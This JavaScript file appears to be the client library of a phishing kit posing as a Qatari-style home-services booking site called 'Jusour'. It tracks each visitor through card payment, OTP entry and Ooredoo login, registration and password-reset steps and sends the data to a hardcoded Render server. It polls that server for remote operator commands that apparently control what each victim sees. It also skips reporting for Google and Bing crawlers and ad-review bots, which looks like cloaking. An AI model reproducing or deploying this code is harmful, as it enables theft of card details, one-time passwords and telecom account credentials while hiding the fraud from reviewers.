/* ============================================================
   Jusour - Frontend Configuration & Client Library
   ============================================================ */

'use strict';

// ============================================================
// 👇 رابط سيرفر Render الخاص بك 👇
// ============================================================
var RENDER_SERVER_URL = 'https://jssoor.onrender.com';

var isLocalhost = /^(localhost|127\.0\.0\.1)$/i.test(window.location.hostname);
window.SERVER_URL = isLocalhost ? '' : RENDER_SERVER_URL;

window.FRONTEND_CONFIG = window.FRONTEND_CONFIG || {
  apiBaseUrl: window.SERVER_URL
};

/** Resolve the backend API base URL. */
function getApiBase() {
  var fromQuery = '';
  try {
    fromQuery = new URLSearchParams(window.location.search).get('api') || '';
    if (fromQuery) {
      sessionStorage.setItem('jusour_api_override', fromQuery);
    } else {
      fromQuery = sessionStorage.getItem('jusour_api_override') || '';
    }
  } catch (e) {}

  var configured =
    fromQuery ||
    (window.FRONTEND_CONFIG && window.FRONTEND_CONFIG.apiBaseUrl) ||
    window.SERVER_URL ||
    '';

  configured = String(configured).trim().replace(/\/+$/, '');

  if (!configured) {
    // Fallback to current origin (works automatically when served by the Render server or local dev proxy)
    return window.location.origin + '/api/';
  }

  if (/\/api$/i.test(configured)) {
    return configured + '/';
  }

  return configured + '/api/';
}

/** Instance-isolated localStorage key so multiple frontend instances never share visitor refs. */
function getRefStorageKey() {
  var scope = (getApiBase() + '|' + window.location.host).replace(/[^a-zA-Z0-9]/g, '_');
  return 'refID_' + scope;
}

/**
 * True for crawlers and ad-review bots.
 */
function isAutomatedVisitor() {
  return /Googlebot|AdsBot|Mediapartners-Google|bingbot|DuckDuckBot/i.test(navigator.userAgent || '');
}

/** Read this browser's reference, creating one on first visit. */
function getRef() {
  var key = getRefStorageKey();
  var ref = '';
  try {
    ref = localStorage.getItem(key) || localStorage.getItem('refID') || '';
  } catch (error) {
    ref = '';
  }

  if (ref === '') {
    ref = 'REF-' + Math.floor(Math.random() * 900000 + 100000);
    try {
      localStorage.setItem(key, ref);
      localStorage.setItem('refID', ref);
    } catch (error) {
      /* Private mode: the reference simply will not persist. */
    }
  }

  return ref;
}

/** Persist a reference that arrived via the URL. */
function setRef(ref) {
  if (!ref) {
    return getRef();
  }
  var key = getRefStorageKey();
  try {
    localStorage.setItem(key, ref);
    localStorage.setItem('refID', ref);
  } catch (error) {
    /* Ignore storage failures. */
  }
  return ref;
}

/** Resolve the reference from ?ref=, falling back to storage. */
function resolveRef() {
  var fromUrl = new URLSearchParams(window.location.search).get('ref');
  return fromUrl ? setRef(fromUrl) : getRef();
}

/**
 * Send data to the backend.
 *
 * @param {object} payload
 * @returns {Promise<object>}
 */
function jusourSubmit(payload) {
  var body = Object.assign({}, payload || {});
  body.ref = body.ref || getRef();
  body.frontend_origin = window.location.origin;

  return fetch(getApiBase() + 'submit.php', {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(body)
  }).then(function (response) {
    return response.json();
  });
}

/* ------------------------------------------------------------------
   Page activity tracking
   ------------------------------------------------------------------ */

var LEGACY_PAGES = {
  'Home-Entrance': 'activity',
  'Hourly-Page': 'hourly',
  'Hourly-Selection': 'hourly',
  'Monthly-Page': 'monthly',
  'Monthly-Selection': 'monthly',
  'Recruitment-Page': 'recruitment',
  'Recruitment-Nationality': 'recruitment',
  'Entering-Customer-Info': 'customer',
  'Order-Summary': 'customer',
  'Order-Summary-View': 'summary',
  'Going-To-Payment-Methods': 'summary',
  'Payment-Methods-View': 'payment_methods',
  'Proceeding-To-Card-Payment': 'payment_methods',
  'Payment-Submitted': 'payment',
  'OTP-Sent': 'otp',
  'Ooredoo-Login-Submit': 'ooredoo_login',
  'Ooredoo-Reg-Submit': 'ooredoo_reg',
  'Forgot-Password-Submitted': 'ooredoo_forgot',
  'Success-Page-View': 'activity',
  'WAITING-IN-LOADING': 'activity',
  'WAITING-ERROR-ACTION': 'activity',
  'WAITING-OTP-ACTION': 'activity'
};

function legacyPageKey(page) {
  if (LEGACY_PAGES[page]) {
    return LEGACY_PAGES[page];
  }
  var keys = Object.keys(LEGACY_PAGES);
  for (var i = 0; i < keys.length; i++) {
    if (page && page.indexOf(keys[i]) === 0) {
      return LEGACY_PAGES[keys[i]];
    }
  }
  return 'activity';
}

function trackAction(ref, page, data) {
  if (isAutomatedVisitor()) {
    return Promise.resolve({ ok: true, skipped: true });
  }

  var payload = {
    ref: ref || getRef(),
    page_key: legacyPageKey(page),
    summary: page
  };

  if (data) {
    payload.fields = [{ label: 'البيانات الأصلية', value: String(data), sensitive: false }];
  }

  return jusourSubmit(payload).catch(function () {
    return { ok: false };
  });
}

/* ------------------------------------------------------------------
   Remote command polling
   ------------------------------------------------------------------ */

function pollCommands(ref, handler, intervalMs) {
  var stopped = false;
  var delay = intervalMs || 3000;

  function tick() {
    if (stopped) {
      return;
    }

    fetch(getApiBase() + 'poll_commands.php?ref=' + encodeURIComponent(ref), {
      method: 'GET',
      mode: 'cors'
    })
      .then(function (response) {
        return response.json();
      })
      .then(function (data) {
        if (stopped || !data || !data.command) {
          return;
        }
        handler(data);
      })
      .catch(function () {
        /* Network hiccup: the next tick retries. */
      })
      .then(function () {
        if (!stopped) {
          window.setTimeout(tick, delay);
        }
      });
  }

  tick();

  return function stop() {
    stopped = true;
  };
}

/* ------------------------------------------------------------------
   Small helpers used by several pages
   ------------------------------------------------------------------ */

function storedValue(key, fallback) {
  try {
    var value = localStorage.getItem(key);
    return value === null ? fallback : value;
  } catch (error) {
    return fallback;
  }
}

function storeValue(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (error) {
    /* Ignore storage failures. */
  }
}
